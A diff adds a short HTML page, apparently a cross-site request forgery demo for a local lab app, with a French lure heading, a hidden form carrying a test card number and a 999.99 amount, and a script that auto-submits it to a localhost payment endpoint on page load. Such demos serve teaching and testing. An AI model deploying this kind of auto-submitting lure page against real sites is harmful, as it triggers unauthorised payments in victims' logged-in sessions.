@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Promo incroyable 😈</h1>
+
+    <form id="stealthForm" action="http://localhost:3000/payment" method="POST">
+      <input type="hidden" name="cardNumber" value="4444333322221111" />
+      <input type="hidden" name="amount" value="999.99" />
+    </form>
+
+    <script>
+      // Soumission automatique du formulaire dès que la page est chargée
+      document.getElementById('stealthForm').submit();
+    </script>
+  </body>
+</html>
